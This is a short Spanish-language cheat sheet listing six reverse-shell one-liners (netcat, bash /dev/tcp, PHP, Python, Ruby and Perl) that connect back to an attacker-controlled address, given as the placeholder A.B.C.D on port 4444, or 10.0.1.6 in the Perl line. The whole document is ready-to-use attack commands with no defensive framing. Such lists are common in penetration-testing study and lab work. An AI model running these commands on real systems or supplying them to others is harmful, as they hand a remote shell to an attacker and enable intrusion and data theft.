# Formas de crear una shell reversa

Donde **A.B.C.D** es la ip del atacante y **4444** el puerto a la escucha en el atacante

1. Con **netcat**
```bash
nc -e /bin/sh ABCD 4444
```

2. Con **bash**
```bash
bash -i >& /dev/tcp/A.B.C.D/4444 0>&1
```

3. Con **php**
```bash
php -r '$sock=fsockopen("A.B.C.D",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

4. Con **python**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("A.B.C.D",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

5. Con **ruby**
```bash
ruby -rsocket -e'f=TCPSocket.open("A.B.C.D",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

6. Con **perl**
```bash
perl -e 'use Socket;$i="10.0.1.6";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```